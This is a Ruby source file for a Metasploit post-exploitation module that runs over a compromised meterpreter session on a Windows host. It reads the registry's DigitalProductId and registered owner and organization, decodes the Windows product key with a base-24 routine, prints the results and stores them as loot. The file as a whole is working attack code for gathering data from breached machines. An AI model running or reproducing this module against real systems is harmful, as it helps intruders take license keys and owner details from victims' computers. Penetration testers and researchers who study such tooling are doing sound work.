##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry

	def initialize(info={})
		super(update_info(info,
				'Name'          => 'Windows Gather Product Key',
				'Description'   => %q{ This module will enumerate the OS license key },
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Brandon Perry'],
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
	end

	def app_list
		tbl = Rex::Ui::Text::Table.new(
			'Header'  => "Keys",
			'Indent'  => 1,
			'Columns' =>
				[
					"Product",
					"Registered Owner",
					"Registered Organization",
					"License Key"
				])

		keys = [ "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" ]

		keys.each do |keyx86|
			key      = nil
			keychunk = registry_getvaldata(keyx86, "DigitalProductId")
			key      = decode(keychunk.unpack("C*")) if not keychunk.nil?

			appname = registry_getvaldata(keyx86, "ProductName")
			rowner  = registry_getvaldata(keyx86, "RegisteredOwner")
			rorg    = registry_getvaldata(keyx86, "RegisteredOrganization")

			#In some cases organization info might not be there even though
			#there's a licenses key
			rorg = '' if rorg.nil?

			#Only save info if appname, rowner, and key are found
			if not appname.nil? and not rowner.nil? and not key.nil?
				tbl << [appname,rowner,rorg,key]
			end
		end

		#Only save data to disk when there's something in the table
		if not tbl.rows.empty?
			results = tbl.to_csv
			print_line("\n" + tbl.to_s + "\n")
			path = store_loot("host.ms_keys", "text/plain", session, results, "ms_keys.txt", "Microsoft Product Key and Info")
			print_status("Keys stored in: #{path.to_s}")
		end
	end

	def decode(chunk)
		start = 52
		finish = start + 15

		#charmap idex
		alphas = %w[B C D F G H J K M P Q R T V W X Y 2 3 4 6 7 8 9]

		decode_length = 29
		string_length = 15

		#product ID in coded bytes
		product_id = Array.new

		#finished and finalized decoded key
		key = ""

		#From byte 52 to byte 67, inclusive
		(52).upto(67) do |i|
			product_id[i-start] = chunk[i]
		end

		#From 14 down to 0, decode each byte in the
		#currently coded product_id
		(decode_length-1).downto(0) do |i|

			if ((i + 1) % 6) == 0
				key << "-"
			else
				mindex = 0 #char map index

				(string_length-1).downto(0) do |s|
					t = ((mindex << 8) & 0xffffffff) | product_id[s]
	      	 		product_id[s] = t / 24
					mindex = t % 24
				end

				key << alphas[mindex]
			end
		end

		return key.reverse
	end

	def run
		print_status("Finding Microsoft key on #{sysinfo['Computer']}")
		app_list
	end

end
